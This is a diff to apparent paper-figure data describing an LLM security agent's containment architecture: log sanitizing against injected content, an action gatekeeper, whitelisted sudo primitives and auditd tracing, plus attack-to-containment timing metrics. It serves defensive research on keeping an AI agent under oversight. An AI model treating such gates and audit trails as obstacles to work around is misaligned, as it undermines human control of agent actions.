+        "Root_OS_Action": 0.2,
+        "Arbitrary_Shell": 0.2
+      },
+      "betweenness_centrality": {
+        "Agent_User": 0.0,
+        "Sudoers_Whitelist": 0.2,
+        "Yoructl_Dispatcher": 0.2,
+        "CIS_Primitive": 0.15,
+        "Root_OS_Action": 0.0,
+        "Arbitrary_Shell": 0.0
+      },
+      "privilege_containment": "Principle of Least Privilege rigorously enforced via sudoers whitelist"
+    }
   },
   "14_temporal_attack": {
     "id": 14,
     "name": "Temporal Attack Graph",
-    "description": "Temporal progression from malicious probe at t0 to autonomous containment at t3.",
-    "findings": "Average time-to-containment is under 1.8 seconds upon telemetry arrival at yoru-watch.",
+    "paper_figure": "Fig. 7",
+    "description": "Empirical temporal chain: attack_start → detection → LLM decision → gate → action → audit.",
+    "findings": "Mean end-to-end containment latency across 50 trials is 2.01s, ensuring rapid autonomous neutralization.",
     "nodes": [
       {
-        "id": "T0_Probe",
-        "label": "T0 (03:14:00): SSH Brute & Log Injection",
+        "id": "T0_Attack_Start",
+        "label": "T0 (03:14:00.000): Attack Start (SSH/Log Probe)",
         "type": "timestamp",
         "color": "#F43F5E"
       },
       {
-        "id": "T1_Kernel_Trap",
-        "label": "T1 (03:14:01): Kernel auditd Records Event",
+        "id": "T1_Detection",
+        "label": "T1 (03:14:00.820): Kernel Auditd Detection (+0.82s)",
         "type": "timestamp",
         "color": "#FBBF24"
       },
       {
-        "id": "T2_Deliberate",
-        "label": "T2 (03:14:02): Deliberation & Action Gate",
+        "id": "T2_Deliberation",
+        "label": "T2 (03:14:01.440): LLM Deliberation (+0.62s)",
         "type": "timestamp",
         "color": "#3B82F6"
       },
       {
-        "id": "T3_Remediate",
-        "label": "T3 (03:14:03): Atomic Rollback & Containment",
+        "id": "T3_Gatekeeper",
+        "label": "T3 (03:14:01.620): Gatekeeper Confinement (+0.18s)",
         "type": "timestamp",
         "color": "#10B981"
+      },
+      {
+        "id": "T4_Action_Exec",
+        "label": "T4 (03:14:01.810): Remediation Action (+0.19s)",
+        "type": "timestamp",
+        "color": "#10B981"
+      },
+      {
+        "id": "T5_Audit_Sink",
+        "label": "T5 (03:14:02.010): Kernel Audit Sink Recorded (+0.20s)",
+        "type": "timestamp",
+        "color": "#E8B64C"
       }
     ],
     "edges": [
       {
-        "source": "T0_Probe",
-        "target": "T1_Kernel_Trap",
-        "relation": "latency: 0.8s",
-        "weight": 1.0
+        "source": "T0_Attack_Start",
+        "target": "T1_Detection",
+        "relation": "telemetry_latency: 0.82s",
+        "weight": 0.82
       },
       {
-        "source": "T1_Kernel_Trap",
-        "target": "T2_Deliberate",
-        "relation": "latency: 0.6s",
-        "weight": 1.0
+        "source": "T1_Detection",
+        "target": "T2_Deliberation",
+        "relation": "inference_latency: 0.62s",
+        "weight": 0.62
       },
       {
-        "source": "T2_Deliberate",
-        "target": "T3_Remediate",
-        "relation": "latency: 0.4s (Total: 1.8s)",
-        "weight": 1.0
+        "source": "T2_Deliberation",
+        "target": "T3_Gatekeeper",
+        "relation": "gate_latency: 0.18s",
+        "weight": 0.18
+      },
+      {
+        "source": "T3_Gatekeeper",
+        "target": "T4_Action_Exec",
+        "relation": "execution_latency: 0.19s",
+        "weight": 0.19
+      },
+      {
+        "source": "T4_Action_Exec",
+        "target": "T5_Audit_Sink",
+        "relation": "audit_sink_latency: 0.20s",
+        "weight": 0.2
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 5,
+      "density": 0.1667,
+      "average_path_length": 2.3333,
+      "in_degree": {
+        "T0_Attack_Start": 0,
+        "T1_Detection": 1,
+        "T2_Deliberation": 1,
+        "T3_Gatekeeper": 1,
+        "T4_Action_Exec": 1,
+        "T5_Audit_Sink": 1
+      },
+      "out_degree": {
+        "T0_Attack_Start": 1,
+        "T1_Detection": 1,
+        "T2_Deliberation": 1,
+        "T3_Gatekeeper": 1,
+        "T4_Action_Exec": 1,
+        "T5_Audit_Sink": 0
+      },
+      "total_degree": {
+        "T0_Attack_Start": 1,
+        "T1_Detection": 2,
+        "T2_Deliberation": 2,
+        "T3_Gatekeeper": 2,
+        "T4_Action_Exec": 2,
+        "T5_Audit_Sink": 1
+      },
+      "degree_centrality": {
+        "T0_Attack_Start": 0.2,
+        "T1_Detection": 0.4,
+        "T2_Deliberation": 0.4,
+        "T3_Gatekeeper": 0.4,
+        "T4_Action_Exec": 0.4,
+        "T5_Audit_Sink": 0.2
+      },
+      "betweenness_centrality": {
+        "T0_Attack_Start": 0.0,
+        "T1_Detection": 0.2,
+        "T2_Deliberation": 0.3,
+        "T3_Gatekeeper": 0.3,
+        "T4_Action_Exec": 0.2,
+        "T5_Audit_Sink": 0.0
+      },
+      "total_containment_latency": "2.01s (attack_start to audit_sink)",
+      "empirical_benchmark_trials": "50 adversarial injection trials"
+    }
   },
   "15_closed_loop": {
     "id": 15,
-    "name": "YORU Closed-Loop Graph (Master Architecture)",
-    "description": "The foundational closed-loop control graph uniting log ingestion, deliberation, gatekeeper, execution, and kernel audit sink.",
-    "findings": "Complete non-repudiable bilateral loop: Kernel records attacker origin as well as autonomous agent remediation.",
+    "name": "Master Closed Loop Graph (Architecture)",
+    "paper_figure": "Fig. 1 (Architecture Figure)",
+    "description": "Foundational architectural figure: Kernel → Log Sanitizer → LLM Proxy → Action Gate → yoructl → auditd → Kernel.",
+    "findings": "Forms an unbroken closed loop uniting untrusted observation, model deliberation, policy gatekeeping, discrete execution, and forensic audit sink.",
     "nodes": [
       {
-        "id": "M_Kernel_Source",
-        "label": "1. Linux Kernel (Syscall & Drift Source)",
-        "type": "core_engine",
+        "id": "M1_Kernel_Source",
+        "label": "1. Linux Kernel (Syscall & Config Drift)",
+        "type": "kernel",
         "color": "#E8B64C"
       },
       {
-        "id": "M_Log_Sanitizer",
-        "label": "2. Untrusted Log Ingestion & Delimiters",
+        "id": "M2_Log_Sanitizer",
+        "label": "2. Log Sanitizer (Delimiter Encapsulation)",
         "type": "sanitizer",
         "color": "#3B82F6"
       },
       {
-        "id": "M_LLM_Proxy",
-        "label": "3. AI Deliberation Engine & Proxy",
+        "id": "M3_LLM_Proxy",
+        "label": "3. LLM Deliberation Engine (yoru-model-proxy)",
         "type": "intelligence",
-        "color": "#FBBF24"
+        "color": "#F59E0B"
       },
       {
-        "id": "M_Action_Gate",
-        "label": "4. Constrained Gatekeeper (Approval Check)",
-        "type": "governance",
+        "id": "M4_Action_Gate",
+        "label": "4. Action Gatekeeper (Risk & Approval Whitelist)",
+        "type": "gatekeeper",
         "color": "#10B981"
       },
       {
-        "id": "M_Yoructl_Exec",
-        "label": "5. yoructl Discrete CIS Primitives",
-        "type": "execution",
+        "id": "M5_Yoructl_Dispatcher",
+        "label": "5. yoructl Dispatcher (40 CIS Primitives Only)",
+        "type": "dispatcher",
         "color": "#10B981"
       },
       {
-        "id": "M_Auditd_Sink",
-        "label": "6. Closed-Loop Audit Sink (AUID=1001)",
-        "type": "accountability",
+        "id": "M6_Auditd_Sink",
+        "label": "6. Closed-Loop Audit Sink (/var/log/audit/audit.log)",
+        "type": "audit_sink",
         "color": "#E8B64C"
       }
     ],
     "edges": [
       {
-        "source": "M_Kernel_Source",
-        "target": "M_Log_Sanitizer",
-        "relation": "emits_telemetry",
+        "source": "M1_Kernel_Source",
+        "target": "M2_Log_Sanitizer",
+        "relation": "1. Emits Raw Telemetry",
         "weight": 1.0
       },
       {
-        "source": "M_Log_Sanitizer",
-        "target": "M_LLM_Proxy",
-        "relation": "delivers_structured_context",
+        "source": "M2_Log_Sanitizer",
+        "target": "M3_LLM_Proxy",
+        "relation": "2. Structured Context",
         "weight": 1.0
       },
       {
-        "source": "M_LLM_Proxy",
-        "target": "M_Action_Gate",
-        "relation": "proposes_discrete_action",
+        "source": "M3_LLM_Proxy",
+        "target": "M4_Action_Gate",
+        "relation": "3. Proposes Discrete Action",
         "weight": 1.0
       },
       {
-        "source": "M_Action_Gate",
-        "target": "M_Yoructl_Exec",
-        "relation": "authorizes_and_dispatches",
+        "source": "M4_Action_Gate",
+        "target": "M5_Yoructl_Dispatcher",
+        "relation": "4. Authorizes Action",
         "weight": 1.0
       },
       {
-        "source": "M_Yoructl_Exec",
-        "target": "M_Auditd_Sink",
-        "relation": "records_remediation_AUID_1001",
+        "source": "M5_Yoructl_Dispatcher",
+        "target": "M6_Auditd_Sink",
+        "relation": "5. Traced under AUID=1001",
         "weight": 1.0
       },
       {
-        "source": "M_Auditd_Sink",
-        "target": "M_Kernel_Source",
-        "relation": "verifies_system_integrity (Closed Loop)",
+        "source": "M6_Auditd_Sink",
+        "target": "M1_Kernel_Source",
+        "relation": "6. Non-Repudiable Verification",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 6,
+      "density": 0.2,
+      "average_path_length": 3.0,
+      "in_degree": {
+        "M1_Kernel_Source": 1,
+        "M2_Log_Sanitizer": 1,
+        "M3_LLM_Proxy": 1,
+        "M4_Action_Gate": 1,
+        "M5_Yoructl_Dispatcher": 1,
+        "M6_Auditd_Sink": 1
+      },
+      "out_degree": {
+        "M1_Kernel_Source": 1,
+        "M2_Log_Sanitizer": 1,
+        "M3_LLM_Proxy": 1,
+        "M4_Action_Gate": 1,
+        "M5_Yoructl_Dispatcher": 1,
+        "M6_Auditd_Sink": 1
+      },
+      "total_degree": {
+        "M1_Kernel_Source": 2,
+        "M2_Log_Sanitizer": 2,
+        "M3_LLM_Proxy": 2,
+        "M4_Action_Gate": 2,
+        "M5_Yoructl_Dispatcher": 2,
+        "M6_Auditd_Sink": 2
+      },
+      "degree_centrality": {
+        "M1_Kernel_Source": 0.4,
+        "M2_Log_Sanitizer": 0.4,
+        "M3_LLM_Proxy": 0.4,
+        "M4_Action_Gate": 0.4,
+        "M5_Yoructl_Dispatcher": 0.4,
+        "M6_Auditd_Sink": 0.4
+      },
+      "betweenness_centrality": {
+        "M1_Kernel_Source": 0.5,
+        "M2_Log_Sanitizer": 0.5,
+        "M3_LLM_Proxy": 0.5,
+        "M4_Action_Gate": 0.5,
+        "M5_Yoructl_Dispatcher": 0.5,
+        "M6_Auditd_Sink": 0.5
+      },
+      "closed_loop_topology": "Bilateral cyclical invariant (Hamiltonian cycle of length 6)"
+    }
   }
 }
